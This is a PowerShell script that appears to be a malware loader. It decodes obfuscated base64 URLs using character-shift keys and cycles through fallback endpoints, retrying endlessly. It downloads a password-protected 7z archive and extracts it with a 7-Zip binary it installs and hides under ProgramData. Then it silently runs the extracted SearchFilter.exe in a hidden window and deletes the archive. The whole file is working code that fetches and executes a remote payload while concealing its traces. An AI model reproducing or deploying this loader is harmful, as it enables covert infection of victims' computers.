function firstFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==" -if $true
    }
    catch
    {
        secondFunctionCall
    }
};

function secondFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCoMOcw53ClsOSw5vDosK5w5bCssOjwqLClsOXZcKiw5rDm8KWw4PCqcOlwrnDrXnDlcKtbMOewp/CosOkwrbCocORw5/DqsK+w5nCusKRw6HCnMOMwqvCqcOSwrZWwpHDgMOYwrbDpsK3" -io $true
    }
    catch
    {
        thirdFunctionCall
    }
};

function thirdFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCtsOcw67CpcOUwqjDlsK6wqPCm8OUwrxhwqxqwpLDlMOue8Kg" -io $true
    }
    catch
    {
        fourthFunctionCall
    }
};

function fourthFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCocOcw5zCpMKNw6HDo8OEw5vCr8OQwqLCkMOXwqNsw5HDqMKUw5TDp8OZw4PDqHLDj8KjXsKhwqLCp8ODwrzCgMOSwqfDoMOOwrvCu8ODw5Z6wpzCjG7Dk8OMesKUw5nDp8OLw4bCuMKtw5fCk8OZwojCgcKvw6FkwpjDn8OFw4HCtXvDosKjwpLDjMKfwrHCrMOuwqTDj8K3w6fCvcOVwrXDlMOiwpQ=" -io $true
    }
    catch
    {
        Start-Sleep -Seconds 20;
        firstFunctionCall
    }
};

function downloadAndDecode
{
    param
    (
        [string]$passedString, [switch]$io = $false, [switch]$if = $false
    )
    
    if (-not $passedString)
    {
        return
    }

    try
    {
        if ($io)
        {
            $retrievedUrl = getUrlFromStringAndDictionary -base64String $passedString -hardcodedDictionary $prooc;
            $r = Invoke-RestMethod -Uri $retrievedUrl -Method Get;
            $c = $r | Out-String;

            $rp = "([a-zA-Z0-9+/=]{50,})\.deodorantkindredimpo";
            $m = [regex]::Match($c, $rp);

            if (!$m.Success -or !$m.Groups[1].Value)
            {
                throw
            }
            
            $secondUrl = getUrlFromStringAndDictionary -base64String $m.Groups[1].Value -hardcodedDictionary $proc
        }
        
        if ($if)
        {
            $thirdUrl = getUrlFromStringAndDictionary -base64String $passedString -hardcodedDictionary $prooc;
            $thirdUrlContent = Invoke-RestMethod -Uri $thirdUrl;

            if ($thirdUrlContent)
            {
                $secondUrl = getUrlFromStringAndDictionary -base64String $thirdUrlContent -hardcodedDictionary $proc
            }
        }
        
        $randomString = [System.Guid]::NewGuid().ToString();
        $tempPath = [System.IO.Path]::GetTempPath();
        $tempFilePath = Join-Path $tempPath ($randomString + ".7z");

        $randomPath2 = Join-Path $tempPath ([System.Guid]::NewGuid().ToString());
        $webclient = New-Object System.Net.WebClient;
        $secondUrlData = $webclient.DownloadData($secondUrl);

        if ($secondUrlData.Length -gt 0)
        {
            [System.IO.File]::WriteAllBytes($tempFilePath, $secondUrlData);

            extract7zArchive -inputFile $tempFilePath -outputFile $randomPath2;
            $searchFilterPath = Join-Path $randomPath2 "SearchFilter.exe";

            if (Test-Path $searchFilterPath)
            {
                Start-Process -FilePath $searchFilterPath -WindowStyle Hidden
            };

            if (Test-Path $tempFilePath)
            {
                Remove-Item $tempFilePath
            }
        }
    }
    catch
    {
        throw
    }
}

$prooc = "UtCkt-h6=my1_zt";

function getUrlFromStringAndDictionary
{
    param 
    (
        [string]$base64String, [string]$hardcodedDictionary
    )
    
    try
    {
        $b = [System.Convert]::FromBase64String($base64String);
        $decodedString = [System.Text.Encoding]::UTF8.GetString($b);
        $url = New-Object char[] $decodedString.Length;

        for ($i = 0; $i -lt $decodedString.Length; $i++)
        {
            $c = $decodedString[$i];
            $p = $hardcodedDictionary[$i % $hardcodedDictionary.Length];
            $url[$i] = [char]($c - $p)
        }
        
        return -join $url
    }
    catch
    {
        throw
    }
}

$proc = "qpb9,83M8n@~{ba;
W`$,}";

function retrievePassword
{
    param
    (
        [string]$base64String
    )
    
    try
    {
        $b = [System.Convert]::FromBase64String($base64String);
        $decodedString = [System.Text.Encoding]::UTF8.GetString($b);

        $c = $decodedString -split ' ';
        $password = "";
        
        foreach ($x in $c)
        {
            $password += [char][int]$x
        }
        
        return $password
    }
    catch
    {
        throw
    }
};

function extract7zArchive
{
    param
    (
        [string]$inputFile, [string]$outputFile
    )
    
    try
    {
        $base46StringPassword = "MTA0IDgyIDUxIDk0IDM4IDk4IDUwIDM3IDY1IDU3IDMzIDEwMyA3NSA0MiA1NCA3NiAxMTMgODAgNTUgMTE2IDM2IDc4IDExMiA4Nw==";
        $password = retrievePassword -base64String $base46StringPassword;

        $7zPath = "C:\ProgramData\sevenZip\7z.exe";
        $arg = "x `"$inputFile`" -o`"$outputFile`" -p$password -y";

        Start-Process -FilePath $7zPath -ArgumentList $arg -WindowStyle Hidden -Wait
    }
    catch
    {
        throw
    }
};

$7zPath = "C:\ProgramData\sevenZip";

if (-not (Test-Path "$7zPath\7z.exe"))
{
    New-Item -ItemType Directory -Path $7zPath -Force | Out-Null;
    $downloadUrl = "https://www.7-zip.org/a/7zr.exe";
    $outputFile = Join-Path -Path $7zPath -ChildPath "7z.exe";

    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile($downloadUrl, $outputFile);
    $wc.Dispose();

    Set-ItemProperty -Path $outputFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue;
    Set-ItemProperty -Path $7zPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
};

firstFunctionCall